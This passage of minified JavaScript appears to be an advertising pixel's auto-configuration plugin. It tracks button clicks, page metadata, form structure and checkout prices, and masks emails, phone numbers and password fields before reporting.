      for (var e = (o = t[0]).name, n = 1; n < t.length; n++) var r = t[n].level || 0, e = o.level === r - 1 ? t[n].name + " > " + e : t[n].name + " " + e, o = t[n];
      return e;
    }
    function w(t) {
      return t.map(function (t) {
        return t.penalty;
      }).reduce(function (t, e) {
        return t + e;
      }, 0);
    }
    function M(t) {
      var e = I(t);
      switch (y.querySelectorAll(e).length) {
        case 0:
          throw new Error("Can't select any node with this selector: " + e);
        case 1:
          return 1;
        default:
          return;
      }
    }
    function D() {
      return {
        name: "*",
        penalty: 3
      };
    }
    function U(t, e) {
      return {
        name: t.name + ":nth-child(" + e + ")",
        penalty: t.penalty + 1
      };
    }
    function L(t) {
      return "html" !== t.name && !t.name.startsWith("#");
    }
    function k() {
      for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
      var n = t.filter(P);
      return 0 < n.length ? n : null;
    }
    function P(t) {
      return null !== t && t !== undefined;
    }
    function F(t) {
      return C(t).sort(function (t, e) {
        return w(t) - w(e);
      });
    }
    function j(t, e) {
      return y.querySelector(I(t)) === e;
    }
    function B(e) {
      return /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi.test(e) || /(\+?0?86-?)?1[3-9]\d{9}/g.test(e) || /(\+\d{1,2}\s?)?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}/g.test(e) || /^[\-!$><-==&_\/\?\.,0-9:; \]\[%~\"\{\}\)\(\+\@\^\`]/g.test(e) || E.some(function (t) {
        return -1 < e.toLowerCase().indexOf(t.toLowerCase());
      });
    }
    var X = function (t) {
      if (!t || t.nodeType !== Node.ELEMENT_NODE) return "";
      if (t === document.documentElement) return "/HTML";
      for (var e = 1, n = t.previousSibling; n;) n.nodeType === Node.ELEMENT_NODE && n.tagName === t.tagName && e++, n = n.previousSibling;
      var r = t.tagName.toLowerCase();
      return X(t.parentNode) + "/" + r + "[" + e + "]";
    };
    function V(t) {
      try {
        return x(t);
      } catch (e) {
        return X(t);
      }
    }
    var W = undefined && undefined.__read || function (t, e) {
        var n = "function" == typeof Symbol && t[Symbol.iterator];
        if (!n) return t;
        var r,
          o,
          i = n.call(t),
          a = [];
        try {
          for (; (void 0 === e || 0 < e--) && !(r = i.next()).done;) a.push(r.value);
        } catch (u) {
          o = {
            error: u
          };
        } finally {
          try {
            r && !r.done && (n = i["return"]) && n.call(i);
          } finally {
            if (o) throw o.error;
          }
        }
        return a;
      },
      J = undefined && undefined.__spread || function () {
        for (var t = [], e = 0; e < arguments.length; e++) t = t.concat(W(arguments[e]));
        return t;
      };
    var G = function (t) {
        var e = t,
          n = t.parentNode,
          r = 0,
          o = !1;
        try {
          o = Object(u.i)(e);
        } catch (a) {
          Object(A.a)(O.a.CUSTOM_ERROR, a, {
            custom_name: "button_check_error",
            custom_enum: "auto_click",
            extJSON: {
              element: e
            }
          }), o = !1;
        }
        if (o) return e;
        for (; r < 5 && n && n !== document;) {
          var i = !1;
          try {
            i = Object(u.i)(n);
          } catch (a) {
            Object(A.a)(O.a.CUSTOM_ERROR, a, {
              custom_name: "button_check_error",
              custom_enum: "auto_click",
              extJSON: {
                element: e
              }
            }), i = !1;
          }
          if (i) return n;
          n = n.parentNode, r++;
        }
        return t;
      },
      K = function (t) {
        for (var e = 0, n = t.children, r = 0; r < n.length; r++) {
          var o = n[r],
            i = !1;
          try {
            i = Object(u.i)(o);
          } catch (a) {
            Object(A.a)(O.a.CUSTOM_ERROR, a, {
              custom_name: "button_check_error",
              custom_enum: "auto_click",
              extJSON: {
                element: o
              }
            }), i = !1;
          }
          i && e++, e += K(o);
        }
        return e;
      },
      q = function (t, e) {
        void 0 === e && (e = !0);
        for (var n = t.attributes, r = {
            type: "",
            value: "",
            name: "",
            "class": "",
            dataset: "",
            id: "",
            tag: "",
            destination: "",
            xpath: "",
            inner_text: "",
            image_url: "",
            num_child_buttons: 0
          }, o = 0; o < n.length; o++) {
          var i = n[o];
          r[i.name] = i.value;
        }
        var a,
          u,
          c,
          s = t.dataset;
        r.dataset = JSON.stringify(s), r.id = null !== (a = t.id) && void 0 !== a ? a : "", r["class"] = null !== (u = t.className) && void 0 !== u ? u : "", r.tag = t.tagName, r.destination = (s = "", "A" === (a = t).tagName.toUpperCase() ? s = null !== (c = a.getAttribute("href")) && void 0 !== c ? c : "" : "BUTTON" === a.tagName.toUpperCase() ? (c = null !== (u = a.getAttribute("onclick")) && void 0 !== u ? u : "", u = null !== (u = a.getAttribute("formaction")) && void 0 !== u ? u : "", c = c.match(/^.*=(['"])(.*)\1.*$/), u ? s = u : c && (s = c[2])) : "FORM" === a.tagName.toUpperCase() && (s = null !== (a = a.getAttribute("action")) && void 0 !== a ? a : ""), s), r.name = null !== (s = t.getAttribute("name")) && void 0 !== s ? s : "", r.value = null !== (s = t.getAttribute("value")) && void 0 !== s ? s : "", r.type = null !== (s = t.getAttribute("type")) && void 0 !== s ? s : "";
        var s = t.getBoundingClientRect();
        r.rect = s;
        try {
          r.xpath = X(t);
        } catch (l) {
          r.xpath = "", Object(A.a)(O.a.CUSTOM_ERROR, l, {
            custom_name: "button_check_error",
            custom_enum: "auto_click",
            extJSON: {
              element: t
            }
          });
        }
        return r.inner_text = null !== (s = t.innerText) && void 0 !== s ? s : "", r.image_url = null !== (s = t.getAttribute("src")) && void 0 !== s ? s : "", r.num_child_buttons = e ? K(t) : 0, r;
      },
      z = function (t) {
        var e = t.tag,
          n = t["class"],
          r = t.destination,
          o = t.id,
          i = t.name,
          a = t.type,
          u = t.value,
          c = t.rect,
          s = t.xpath,
          l = t.inner_text,
          f = t.image_url,
          c = {
            tag: e,
            attributes: {},
            inner_text: l,
            xpath: s,
            num_child_buttons: t.num_child_buttons,
            timestamp: new Date().toISOString(),
            position: c ? {
              x: c.x,
              y: c.y
            } : {
              x: "",
              y: ""
            }
          };
        return n && (c.attributes["class"] = n), r && (c.attributes.destination = r), o && (c.attributes.id = o), i && (c.attributes.name = i), a && (c.attributes.type = a), u && (c.attributes.value = u), f && (c.image_url = f), c;
      };
    var Y = function (t) {
      if ("" === t) return undefined;
      if (t === undefined) return undefined;
      t = Object(g.sha256)(t);
      return parseInt(t, 16);
    };
    function Z(t, e) {
      return void 0 === e && (e = 500), "string" != typeof t ? "" : (t = t.trim()).length < e ? t : t.slice(0, 500);
    }
    function Q(t) {
      return {
        items: t = void 0 === t ? [] : t,
        has: function (e) {
          return this.items.some(function (t) {
            return t === e;
          });
        },
        add: function (t) {
          this.has(t) || this.items.push(t);
        }
      };
    }
    function $(t) {
      var e;
      switch (t.tagName.toLowerCase()) {
        case "meta":
          e = t.getAttribute("content");
          break;
        case "audio":
        case "embed":
        case "iframe":
        case "img":
        case "source":
        case "track":
        case "video":
          e = t.getAttribute("src");
          break;
        case "a":
        case "area":
        case "link":
          e = t.getAttribute("href");
          break;
        case "object":
          e = t.getAttribute("data");
          break;
        case "data":
        case "meter":
          e = t.getAttribute("value");
          break;
        case "time":
          e = t.getAttribute("datetime");
          break;
        default:
          e = function (t) {
            if (t) {
              if (t.innerText && 0 < t.innerText.length) return t.innerText;
              if (t.textContent && 0 < t.textContent.length) return t.textContent;
            }
            return "";
          }(t) || "";
      }
      return "string" == typeof e ? Z(e) : "";
    }
    function tt() {
      for (var t = document.querySelectorAll("[itemscope]"), e = [], n = Q(), r = 0; r < t.length; r++) n.add(t[r]);
      for (r = t.length - 1; 0 <= r; r--) {
        var o = t[r],
          i = o.getAttribute("itemtype");
        if ("string" == typeof i && "" !== i) {
          for (var a = {}, u = o.querySelectorAll("[itemprop]"), c = 0; c < u.length; c++) {
            var s,
              l,
              f = u[c];
            n.has(f) || (n.add(f), "string" != typeof (s = f.getAttribute("itemprop")) || "" === s || null != (l = $(f)) && (null != (f = a[s]) && function (e, n) {
              return null != [{
                property: "image",
                type: "Product"
              }].filter(function (t) {
                return (e === "https://schema.org/" + t.type || e === "http://schema.org/" + t.type) && t.property === n;
              })[0];
            }(i, s) ? Array.isArray(f) ? a[s].push(l) : a[s] = [f, l] : a[s] = l));
          }
          e.unshift({
            schema: {
              dimensions: {
                h: o.clientHeight,
                w: o.clientWidth
              },
              properties: ot(i) ? {} : a,
              subscopes: [],
              type: i
            },
            scope: o
          });
        }
      }
      for (var d = [], h = [], r = 0; r < e.length; r++) {
        for (var p = e[r], _ = p.scope, m = p.schema, y = d.length - 1; 0 <= y; y--) {
          if (d[y].scope.contains(_)) {
            d[y].schema.subscopes.push(m);
            break;
          }
          d.pop();
        }
        0 === d.length && h.push(m), d.push({
          schema: m,
          scope: _
        });
      }
      return JSON.stringify(h);
    }
    function et() {
      for (var t = v, e = [], n = [], r = document.querySelectorAll('script[type="application/ld+json"]'), o = 0, i = 0; i < r.length; i++) {
        var a = r[i].innerText;
        if (null != a && "" !== a) {
          if (t < (o += a.length)) return {
            data: JSON.stringify([]),
            errors: [{
              name: l.OVER_LENGTH,
              message: "" + String(o)
            }]
          };
          var u = void 0;
          try {
            u = JSON.parse(a.replace(/[\n\r\t]+/g, " "));
          } catch (c) {
            n.push({
              name: l.ERROR_FORMAT,
              message: c.message
            });
          }
          try {
            u = function s(t) {
              {
                if ("object" != typeof t) return t;
                if (Array.isArray(t)) return t.map(function (t) {
                  return s(t);
                });
                var e,
                  n = Object.assign({}, t),
                  r = n["@type"];
                for (e in n) "@type" !== e && "@context" !== e && ("object" == typeof n[e] ? n[e] = s(n[e]) : r && ot(r) && delete n[e]);
                return n;
              }
            }(u);
          } catch (c) {
            return {
              data: JSON.stringify([]),
              errors: [{
                name: l.FILTER_SENSITIVE_FIELDS,
                message: c.message
              }]
            };
          }
          u && e.push(u);
        }
      }
      return {
        data: JSON.stringify(e),
        errors: n
      };
    }
    function nt(t) {
      for (var e = Q(["og", "product", "music", "video", "article", "book", "profile", "website", "twitter"]), n = {}, r = document.querySelectorAll("meta[property],meta[name]"), o = 0; o < r.length; o++) {
        var i = r[o],
          a = i.getAttribute("property") || i.getAttribute("name"),
          u = Z(i.getAttribute("content"));
        "string" == typeof a && -1 !== a.indexOf(":") && "string" == typeof u && e.has(a.split(":")[0]) && (null != (i = n[a]) && function (e) {
          return null != ["og:image"].filter(function (t) {
            return t === e;
          })[0];
        }(a) ? Array.isArray(i) ? n[a].push(u) : n[a] = [i, u] : n[a] = u);
      }
      return JSON.stringify(rt(n, t));
    }
    function rt(t, e) {
      if ("object" != typeof t) return t;
      if (Array.isArray(t)) return t.map(function (t) {
        return rt(t, e);
      });
      var n,
        r = {};
      for (n in t) !function (e, t) {
        return !!(t && 0 < t.length) && t.some(function (t) {
          return e.toLowerCase() === t.toLowerCase();
        });
      }(n, e) && (r[n] = rt(t[n], e));
      return r;
    }
    function ot(e) {
      return Array.isArray(e) ? e.some(ot) : "string" == typeof e && (e = e.toLowerCase().replace(/https?:\/\/schema\.org\//, ""), E.some(function (t) {
        return e === t.toLowerCase();
      }));
    }
    function it(t) {
      var e = {
        open_graph: "{}",
        microdata: "[]",
        json_ld: "[]",
        meta: "{}"
      };
      try {
        e.microdata = tt();
      } catch (i) {
        Object(A.a)(O.a.CUSTOM_ERROR, i, {
          custom_name: "assemble_auto_config_failed",
          custom_enum: "microdata"
        });
      }
      try {
        var n = et(),
          r = n.data,
          o = n.errors;
        e.json_ld = r, o && o.forEach(function (t) {
          var e = t.name,
            t = t.message;
          Object(A.a)(O.a.CUSTOM_ERROR, {
            message: t
          }, {
            custom_name: "parse_json_ld_failed",
            custom_enum: e
          });
        });
      } catch (i) {
        Object(A.a)(O.a.CUSTOM_ERROR, i, {
          custom_name: "assemble_auto_config_failed",
          custom_enum: "json_ld"
        });
      }
      try {
        e.open_graph = nt(t.open_graph);
      } catch (i) {
        Object(A.a)(O.a.CUSTOM_ERROR, i, {
          custom_name: "assemble_auto_config_failed",
          custom_enum: "open_graph"
        });
      }
      try {
        e.meta = function (t) {
          var e = {},
            n = Q(["description", "keywords", "keyword"]),
            r = document.querySelector("title");
          r && (e.title = Z(r.innerText));
          for (var o = document.querySelectorAll("meta[property],meta[name]"), i = 0; i < o.length; i++) {
            var a = o[i],
              u = a.getAttribute("name") || a.getAttribute("property"),
              a = Z(a.getAttribute("content"));
            "string" == typeof u && "string" == typeof a && n.has(u) && (e[u] = a);
          }
          return JSON.stringify(rt({
            title: e.title,
            "meta:description": e.description,
            "meta:keywords": e.keywords || e.keyword
          }, t));
        }(t.meta);
      } catch (i) {
        Object(A.a)(O.a.CUSTOM_ERROR, i, {
          custom_name: "assemble_auto_config_failed",
          custom_enum: "meta"
        });
      }
      return e;
    }
    var at,
      ut = ["form", "[id*=form], [class*=form]"],
      ct = ["label"],
      st = ["input,select,textarea"],
      lt = ["radio", "checkbox"],
      ft = ["hidden", "reset", "submit", "password"];
    function dt(t, e) {
      try {
        for (var n = 0; n < t.length; n++) {
          var r = e.querySelectorAll(t[n]);
          if (r && 0 < r.length) return Array.from(r);
        }
        return [];
      } catch (o) {
        return Object(A.a)(O.a.CUSTOM_ERROR, o, {
          custom_name: _,
          custom_enum: s.GET_ELEMENTS_ERROR
        }), [];
      }
    }
    function ht(t, e) {
      return function n(t) {
        return null == t || t.isSameNode(e) ? e : 0 < _t(t).length ? t : n(t.parentNode);
      }(t.parentNode);
    }
    function pt(t, e) {
      var n = dt(st, t);
      if (n && n.length) return {
        els: n,
        from: at.CONTAIN
      };
      var r,
        o = t.getAttribute("for");
      return !(!o || !(n = dt(["input[id='" + (r = o) + "'],select[id='" + r + "'],textarea[id='" + r + "']"], e))) && {
        els: n,
        from: at.ID
      };
    }
    function _t(t) {
      var e = "";
      return function n(t) {
        for (; t;) t.nodeType === Node.TEXT_NODE ? e += t.textContent : "SELECT" !== t.nodeName && t.firstChild && n(t.firstChild), t = t.nextSibling;
      }(t.firstChild), e.replace(/[\t\n]/g, "").trim();
    }
    function mt(t) {
      if (!t) return !1;
      var e = window.getComputedStyle(t);
      return "none" !== e.display && "visible" === e.visibility && !function n(t) {
        if (!t || t.isSameNode(document.body) || t.isSameNode(document)) return !1;
        var e = window.getComputedStyle(t);
        return "0" == e.opacity || n(t.parentElement);
      }(t) && (0 !== t.offsetWidth || 0 !== t.offsetHeight);
    }
    function yt(t) {
      t = t.getAttribute("type");
      return t && -1 < ft.indexOf(t);
    }
    function gt(t) {
      return t && B(t) ? "__Text__" : t;
    }
    (n = at = at || {})[n.CONTAIN = 0] = "CONTAIN", n[n.ID = 1] = "ID", n[n.SELECTOR = 2] = "SELECTOR";
    var Et = (vt.prototype.getRules = function (t) {
      t = t.plugins && t.plugins.AutoConfig;
      return t && t[h.AUTO_FORM];
    }, vt.prototype.init = function () {
      var e = this;
      try {
        this.forms = this.detectFormElement(), this.forms && this.forms.forEach(function (t) {
          t.formDetail = e.assembleFormDetail(t), e.startFormObserver(t, e.formUpdateHandlers);
        });
      } catch (t) {
        Object(A.a)(O.a.CUSTOM_ERROR, t, {
          custom_name: _,
          custom_enum: s.INIT_ERROR
        });
      }
    }, vt.prototype.getOverallFormDetail = function () {
      try {
        return this.forms && 0 < this.forms.length ? (this.forms.some(function (t) {
          t = t.el;
          return !document.body.contains(t);
        }) && this.init(), JSON.stringify(this.forms.map(function (t) {
          return t.formDetail;
        }).filter(function (t) {
          return t;
        }))) : "[]";
      } catch (t) {
        return Object(A.a)(O.a.CUSTOM_ERROR, t, {
          custom_name: _,
          custom_enum: s.GET_OVERALL_FORM_DETAIL_ERROR
        }), "[]";
      }
    }, vt.prototype.addFormUpdateHandler = function (t) {
      this.formUpdateHandlers.push(t);
    }, vt.prototype.startFormObserver = function (e, n) {
      var r = this;
      try {
        var t,
          o = Object(u.c)(function () {
            var t = r.assembleFormDetail(e);
            (!e.formDetail || t && Object(u.k)(t, e.formDetail)) && (e.formDetail = t, n.forEach(function (t) {
              return t.call(r, e.formDetail);
            }));
          }, 2e3, this);
        e.el.parentNode && (t = e.el.parentNode, this.observer && this.observer.disconnect(), this.observer = new MutationObserver(o), this.observer.observe(t, {
          attributes: !0,
          childList: !0,
          subtree: !0
        }), t.addEventListener("click", o, {
          capture: !0
        }));
      } catch (i) {
        Object(A.a)(O.a.CUSTOM_ERROR, i, {
          custom_name: _,
          custom_enum: s.FORM_OBSERVER_ERROR
        });
      }
    }, vt.prototype.detectFormElement = function () {
      try {
        var a = [0, 0, 0],
          t = (n = this.rules, (r = dt(n || ut, document)).filter(function (e) {
            return !r.some(function (t) {
              return t.contains(e) && t !== e;
            });
          }));
        if (!t) return [];
        var e = t.map(function (t) {
          return {
            el: t,
            questions: []
          };
        });
        return e.forEach(function (o) {
          var t,
            t = (t = o.el, dt(ct, t)),
            i = new Set([]);
          t.forEach(function (t) {
            var e,
              n,
              r = pt(t, o.el);
            r && (n = r.els, e = r.from, (n = n.filter(function (t) {
              return !yt(t);
            }).map(function (t) {
              return i.add(t), {
                el: t,
                from: e
              };
            })) && n.length && (a[e] = 1, o.questions.push({
              el: t,
              answers: n
            })));
          }), (t = o.el, dt(st, t).filter(function (t) {
            return !yt(t);
          })).forEach(function (t) {
            var e;
            i.has(t) || (a[at.SELECTOR] = 1, e = ht(t, o.el), o.questions.push({
              el: e,
              answers: [{
                el: t,
                from: at.SELECTOR
              }]
            }));
          });
        }), Object(A.c)(O.a.CUSTOM_INFO, {
          custom_name: "form_detail_answer_from",
          custom_enum: a.join("")
        }), e;
      } catch (o) {
        return Object(A.a)(O.a.CUSTOM_ERROR, o, {
          custom_name: _,
          custom_enum: s.DETECT_FORM_ELEMENT_ERROR
        }), [];
      }
      var n, r;
    }, vt.prototype.calculateQuestionFilledTime = function (t) {
      var e = t.el,
        n = t.answers,
        r = V(e),
        t = n.reduce(function (t, e) {
          var n = e.el,
            e = n.getAttribute("type");
          return e && -1 < lt.indexOf(e.toLowerCase()) ? t + "," + n.checked : t + "," + n.value;
        }, "");
      this.answerMap[r] || (this.answerMap[r] = {
        defaultValue: t,
        value: t
      });
      e = this.answerMap[r], n = e.defaultValue, e = e.filledTime;
      if (n !== (this.answerMap[r].value = t)) return e || (this.answerMap[r].filledTime = +new Date());
      delete this.answerMap[r].filledTime;
    }, vt.prototype.assembleFormDetail = function (t) {
      var o = this,
        e = t.el,
        t = t.questions;
      try {
        var n = {
          xpath: V(e),
          id: e.id,
          name: gt(e.getAttribute("name")),
          tag: e.tagName.toLowerCase(),
          class_name: e.className,
          questions: [],
          width: e.offsetWidth,
          height: e.offsetHeight,
          is_visible: mt(e)
        };
        return n.questions = t.map(function (t) {
          var e = t.el,
            n = t.answers,
            r = {
              xpath: V(e),
              id: e.id,
              name: gt(_t(e)),
              tag: e.tagName.toLowerCase(),
              class_name: e.className,
              filled_time: o.calculateQuestionFilledTime(t),
              answers: [],
              width: e.offsetWidth,
              height: e.offsetHeight,
              is_visible: mt(e)
            };
          return n.forEach(function (t) {
            var e = t.el,
              n = t.from;
            e && "SELECT" === e.tagName.toUpperCase() ? r.answers = r.answers.concat(Array.from(e.querySelectorAll("option")).map(function (t) {
              return {
                xpath: V(t),
                id: t.id,
                name: gt(t.value || t.innerText),
                tag: t.tagName.toLowerCase(),
                class_name: t.className,
                from: n,
                width: t.offsetWidth,
                height: t.offsetHeight,
                is_visible: mt(e)
              };
            })) : r.answers.push({
              xpath: V(e),
              id: e.id,
              name: gt(e.getAttribute("name")),
              tag: e.tagName.toLowerCase(),
              class_name: e.className,
              input_type: e.getAttribute("type"),
              placeholder: gt(e.getAttribute("placeholder")),
              from: n,
              width: e.offsetWidth,
              height: e.offsetHeight,
              is_visible: mt(e)
            });
          }), r;
        }), n;
      } catch (r) {
        return void Object(A.a)(O.a.CUSTOM_ERROR, r, {
          custom_name: _,
          custom_enum: s.ASSEMBLE_FORM_DETAIL_ERROR
        });
      }
    }, vt);
    function vt(t) {
      this.formUpdateHandlers = [], this.answerMap = {}, this.rules = this.getRules(t), this.init();
    }
    var bt = (At.prototype.hasReport = function (t, e, n) {
      return this.reportHistory[this.genHistoryKey(t, e)] === n;
    }, At.prototype.addHistory = function (t, e, n) {
      this.reportHistory[this.genHistoryKey(t, e)] = n;
    }, At.prototype.clearHistory = function () {
      this.reportHistory = {};
    }, At.prototype.genHistoryKey = function (t, e) {
      return t + ":" + e;
    }, At);
    function At() {
      this.reportHistory = {};
    }
    var Ot = undefined && undefined.__values || function (t) {
        var e = "function" == typeof Symbol && Symbol.iterator,
          n = e && t[e],
          r = 0;
        if (n) return n.call(t);
        if (t && "number" == typeof t.length) return {
          next: function () {
            return {
              value: (t = t && r >= t.length ? void 0 : t) && t[r++],
              done: !t
            };
          }
        };
        throw new TypeError(e ? "Object is not iterable." : "Symbol.iterator is not defined.");
      },
      Rt = ["url", "domain", "etld1"],
      St = function (t) {
        try {
          var e = t.plugins && t.plugins.AutoConfig;
          return e && e.vc_rules;
        } catch (n) {
          return undefined;
        }
      },
      Ct = function (t, e) {
        var n, r, o, i, a;
        try {
          var u = t.methods.getPageDetail().pageInfo;
          if (u.url.includes("checkout")) {
            try {
              for (var c = Ot(Rt), s = c.next(); !s.done; s = c.next()) {
                var l = s.value,
                  f = e ? e[l] : undefined;
                if (f) try {
                  for (var d = (o = void 0, Ot(f)), h = d.next(); !h.done; h = d.next()) {
                    var p = h.value,
                      _ = p.currency.val,
                      m = null === (a = document.evaluate(p.valueXpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue) || void 0 === a ? void 0 : a.textContent;
                    if (m) {
                      var y = Tt(m);
                      if (y) {
                        var g = {
                          vc_properties: {
                            value: y,
                            currency: _,
                            ori_value: m,
                            rule_key: p.rule_key
                          }
                        };
                        return Object(A.c)(O.a.CUSTOM_INFO, {
                          custom_name: "auto_value_currency_update_info",
                          extJSON: {
                            url: u.url,
                            autoProperties: g,
                            vcConfig: e
                          }
                        }), Nt(wt, g), g;
                      }
                    }
                  }
                } catch (E) {
                  o = {
                    error: E
                  };
                } finally {
                  try {
                    h && !h.done && (i = d["return"]) && i.call(d);
                  } finally {
                    if (o) throw o.error;
                  }
                }
              }
            } catch (v) {
              n = {
                error: v
              };
            } finally {
              try {
                s && !s.done && (r = c["return"]) && r.call(c);
              } finally {
                if (n) throw n.error;
              }
            }
            return null;
          }
          return null;
        } catch (b) {
          return Object(A.a)(O.a.CUSTOM_ERROR, b, {
            custom_name: "auto_value_currency_update_error",
            custom_enum: "auto_value_currency",
            extJSON: {
              error: b
            }
          }), null;
        }
      };
    function Tt(t) {
      var e,
        n,
        t = t.match(/(?:\d[\d\s,.]*\d|\d)/g);
      if (t) {
        var r = t[0];
        try {
          for (var o = Ot(t), i = o.next(); !i.done; i = o.next()) if (i.value !== r) return null;
        } catch (a) {
          e = {
            error: a
          };
        } finally {
          try {
            i && !i.done && (n = o["return"]) && n.call(o);
          } finally {
            if (e) throw e.error;
          }
        }
        return r;
      }
      return null;
    }
    var xt,
      Ht,
      Nt = function (t, e) {
        try {
          sessionStorage.setItem(t, JSON.stringify(e));
        } catch (n) {}
      },
      It = function (t) {
        try {
          var e = sessionStorage.getItem(t);
          return e ? JSON.parse(e) : null;
        } catch (n) {
          return null;
        }
      },
      wt = "value_currency_rule",
      n = undefined && undefined.__extends || (xt = function (t, e) {
        return (xt = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
        } || function (t, e) {
          for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
        })(t, e);
      }, function (t, e) {
        function n() {
          this.constructor = t;
        }
        xt(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
      }),
      Mt = "AutoConfig",
      Dt = (Ht = o.a, n(Ut, Ht), Ut.prototype.initBaseFeature = function (t) {
        !this.initialize && this.isEnablePlugin(t) && (this.initAutoClick(), this.initAutoCollection(), this.initialize = !0);
      }, Ut.prototype.initExtraFeature = function (t) {
        !this.autoForm && this.initialize && this.isEnableFeature(t, d.AUTO_FORM) && this.initAutoForm(t), this.initAutoVC(t);
      }, Ut.prototype.initAutoClick = function () {
        var e, t;
        e = this.autoClickCallback, t = Object(u.p)(function (t) {
          e(t);
        }, 1e3), document.querySelectorAll(u.b.join(", ")).forEach(function (e) {
          u.a.some(function (t) {
            return e.matches(t);
          }) || e.addEventListener("click", t, {
            capture: !0
          });
        });
      }, Ut.prototype.initAutoVC = function (t) {
        t = St(t);
        t && (this.signal_insights_config = t);
      }, Ut.prototype.initAutoCollection = function () {
        this.updateAutoCollectedMetadata();
      }, Ut.prototype.initAutoForm = function (t) {
        this.autoForm = new Et(t), this.autoForm.addFormUpdateHandler(this.autoFormUpdateHandler.bind(this)), this.autoCollectedFormDetail = this.autoForm.getOverallFormDetail();
      }, Ut.prototype.autoFormUpdateHandler = function () {
        this.autoForm && (this.autoCollectedFormDetail = this.autoForm.getOverallFormDetail(), this.reportFormDetail({
          page_trigger: p.DOM_CHANGE,
          form_details: this.autoCollectedFormDetail
        }));
      }, Ut.prototype.pixelInitEnd = function (t) {
        this.initBaseFeature(t), this.initExtraFeature(t);
      }, Ut.prototype.pixelSend = function (t, e, n) {
        t = this.context.methods.getPixel(t), Ct(this.context, this.signal_insights_config);
        t && St(t) && It(wt) && ("CompletePayment" === e || "Pageview" === e || "InitiateCheckout" === e || "PlaceAnOrder" === e) && (n.auto_collected_properties = It(wt)), "CompletePayment" === e && setTimeout(function () {
          !function (t) {
            try {
              sessionStorage.removeItem(t);
            } catch (e) {}
          }(wt);
        }, 500), "Pageview" === e && (t && !this.isEnablePlugin(t) || (this.reportAutoCollection({
          page_trigger: p.PAGE_VIEW,
          content_data: this.autoCollectedMetadata
        }), this.autoCollectedFormDetail && this.reportFormDetail({
          page_trigger: p.PAGE_VIEW,
          form_details: this.autoCollectedFormDetail
        })));
      }, Ut.prototype.pageUrlDidChange = function (t, e) {
        null != e && "" != e && this.updateAutoCollectedMetadata();
      }, Ut.prototype.pageWillLeave = function () {
        this.autoForm && (this.autoCollectedFormDetail = this.autoForm.getOverallFormDetail(), this.reportHistory.clearHistory(), this.reportFormDetail({
          page_trigger: p.PAGE_LEAVE,
          form_details: this.autoCollectedFormDetail
        }));
      }, Ut.prototype.reportButtonClick = function (t) {
        var e;
        this.report(f.CLICK, d.AUTO_VC, {
          page_trigger: p.CLICK,
          trigger_element: t,
          vc_properties: null === (e = It(wt)) || void 0 === e ? void 0 : e.vc_properties
        }), this.report(f.CLICK, d.AUTO_VC_REVERSE, {
          page_trigger: p.CLICK,
          trigger_element: t
        });
      }, Ut.prototype.updateAutoCollectedMetadata = function () {
        var e = this,
          n = it(this.filter),
          r = {};
        return Object.keys(n).forEach(function (t) {
          n[t] !== e.autoCollectedMetadata[t] && (e.autoCollectedMetadata[t] = r[t] = n[t]);
        }), 0 < Object.keys(r).length && this.reportHistory.clearHistory(), r;
      }, Ut.prototype.report = function (t, e, n) {
        var r = Object(a.a)(i.a.AUTO_CONFIG),
          e = this.getReportPixelList(e, JSON.stringify(n)),
          e = this.assemblyReportData(t, n, e);
        e && r && this.context.reportService.report(r, e, c.a.defaultReport);
      }, Ut.prototype.isEnablePlugin = function (t) {
        var e = t.options,
          t = t.plugins;
        return e && !1 !== e.autoConfig && t && t[Mt];
      }, Ut.prototype.isEnableFeature = function (t, e) {
        if (0, !h[e]) return !0;
        var n = t.plugins;
        return e === d.AUTO_VC_REVERSE ? this.isEnablePlugin(t) && n[Mt] && !n[Mt][h.AUTO_VC] : this.isEnablePlugin(t) && n[Mt] && n[Mt][h[e]];
      }, Ut.prototype.getReportPixelList = function (n, r) {
        var o = this;
        return this.context.methods.getAllPixels().filter(function (t) {
          return !!o.isEnablePlugin(t) && o.isEnableFeature(t, n);
        }).filter(function (t) {
          var e = t.pixelCode;
          return !(-1 < [d.AUTO_COLLECTION, d.AUTO_FORM].indexOf(n) && o.reportHistory.hasReport(n, e, r)) && (o.reportHistory.addHistory(n, e, r), t);
        });
      }, Ut.prototype.assemblyReportData = function (t, e, n) {
        if (0 !== n.length) {
          var r = n.map(function (t) {
              return t.pixelCode;
            }),
            o = this.context.methods.getPageDetail().pageSign,
            n = this.context.methods.assemblyData(r[0], "", {}, {}, i.a.AUTO_CONFIG);
          return delete n.event, n.action = t, n.auto_collected_properties = e, n.context.pixel && (n.context.pixel.codes = r.join("|")), n.context.index = o.index, n.context.session_id = o.sessionId, n.context.pageview_id = o.pageId, n.message_id = n.message_id.replace(/-[^-]*$/, ""), n;
        }
      }, Ut);
    function Ut(t, e) {
      var c = Ht.call(this, t) || this;
      return c.autoCollectedMetadata = {}, c.initialize = !1, c.autoClickCallback = function (t) {
        try {
          Ct(c.context, c.signal_insights_config);
          var e = G(t.target);
          if (e) {
            var n = z(q(e));
            if (o = (null === (i = (r = n).inner_text) || void 0 === i ? void 0 : i.toString().toLowerCase()) || "", i = (null === (a = r.image_url) || void 0 === a ? void 0 : a.toString().toLowerCase()) || "", a = [], r.attributes && (a = [(r = r.attributes)["class"], r.id, r.name, r.type, r.value, r.destination].map(function (t) {
              return (null == t ? void 0 : t.toString().toLowerCase()) || "";
            })), J([o, i], a).some(B)) return;
            c.reportButtonClick(n);
          } else Y(c.context.methods.getPageDetail().pageInfo.url) !== undefined && Y(c.context.methods.getPageDetail().pageInfo.url) % 10 == 8 && Object(A.c)(O.a.CUSTOM_INFO, {
            custom_name: "non_button_element_click",
            extJSON: {
              attributes: z(q(e, !1))
            }
          });
        } catch (u) {
          Object(A.a)(O.a.CUSTOM_ERROR, u, {
            custom_name: "auto_click_callback_error",
            custom_enum: "auto_click"
          });
        }
        var r, o, i, a;
      }, c.reportAutoCollection = Object(u.c)(function (t) {
        c.report(f.METADATA, d.AUTO_COLLECTION, t);
      }, 200, c), c.reportFormDetail = Object(u.c)(function (t) {
